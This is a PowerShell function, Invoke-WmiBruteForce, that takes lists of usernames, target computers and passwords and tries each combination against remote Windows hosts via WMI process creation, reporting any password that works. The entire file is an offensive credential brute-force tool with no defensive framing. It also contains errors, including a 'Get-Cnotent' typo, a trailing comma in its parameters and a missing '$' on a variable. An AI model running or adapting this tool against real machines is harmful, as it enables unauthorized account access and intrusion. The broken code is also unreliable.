Function Invoke-WmiBruteForce {
<#
.PARAMETER userlist
file that contains usernames you wish to gain entry with
 
.PARAMETER ComputerNamelist
file that contains target machines
 
.PARAMETER wordlist
String path to file containing list of words/passwords
 
#>
 
[CMDLetBinding()]
param (
  [Parameter(mandatory=$true)] [String] $userlist,
  [Parameter(mandatory=$true)] [String] $ComputerNameList,
  [Parameter(mandatory=$true)] [String] $wordlist,
)
 
#read list 
$wordlistentries = Get-Content $wordlist
$usernames = Get-Content $userlist
$ComputerNames = Get-Cnotent $ComputerNameList
$flag=0

foreach($computername in $ComputerNames){
    Write-Output "Trying $computername "
    if(flag -eq 1){
        $flag = 0
        continue
    }

    foreach ($user in $usernames ){
        if($flag -eq 1){
            break
        }
        foreach ($entry in $wordlistentries) {
            if($flag -eq 1){
                break
            }
            
            try{
                $PSPassword = $entry | ConvertTo-SecureString -asPlainText -Force;
                $Credential = New-Object System.Management.Automation.PSCredential($user,$PSPassword);
                $outerror = Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $computername -Credential $Credential -ErrorAction Stop;
                "Password Found: $computername $user $entry"
                $flag = 1
                break
            }catch [System.Runtime.InteropServices.COMException]{
                $flag = 1
                break
            }catch [System.Exception]{
                if($_.toString().Contains("ACCESSDENIED")){
                    continue
                }
            }   

        }
    }
}
       
}
